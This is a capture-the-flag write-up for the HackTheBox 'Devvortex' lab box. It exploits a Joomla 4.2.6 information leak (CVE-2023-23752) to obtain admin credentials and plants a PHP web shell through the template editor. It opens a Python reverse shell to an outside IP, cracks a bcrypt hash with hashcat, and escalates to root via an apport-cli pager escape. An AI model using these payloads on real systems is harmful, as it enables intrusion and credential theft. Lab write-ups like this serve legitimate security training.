# Devvortex

## Info

Devvortex is an easy linux box from hackthebox.  

## HTTP 80

Subdomain  

```
http://dev.devvortex.htb
```

### joomla.xml

Location  

```
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

Version  

```
4.2.6
```

### CVE-2023-23752

There is an improper access check on 4.0.0 - 4.2.7 that allows the plaintext user and password of the database. Using curl.  

```
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

Which gives the following credentials.  

```
lewis:P4ntherg0t1n5r3c0n##
```

The above credentials sign lewis into the admin panel, he is a super admin.  

## User

Under the systems tab, there is a site template link which enables editing of the landing page index.php.  

```
<?php if(isset($_REQUEST['cmd'])) system($_REQUEST['cmd']); ?>
```

The landing page is not writable, but the admin panel is.  

```
http://dev.devvortex.htb/administrator/index.php?cmd=whoami
```

Python3 number revshell returns.  

```
export RHOST="10.10.14.81";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

After I access the database with lewis creds, I find the following hash in joomla users table.  

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

hashcat  

```
sudo hashcat -m 3200 -a 0 logan.hash /usr/share/wordlists/rockyou.txt --force
```

Logan password  

```
tequieromucho
```

## root

The user logan can run the following as root.  

```
/usr/bin/apport-cli
```

If this is run as root, viewing the report will drop into a pager. CVE-2023-1326.  
Create a crash file.  

```
/usr/bin/sleep 5000 &
pkill -SIGSEGV sleep
```
Sudo command.  

```
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
```

After pressing v to view report, it drops into a pager, run bash.  

```
!/bin/bash
```
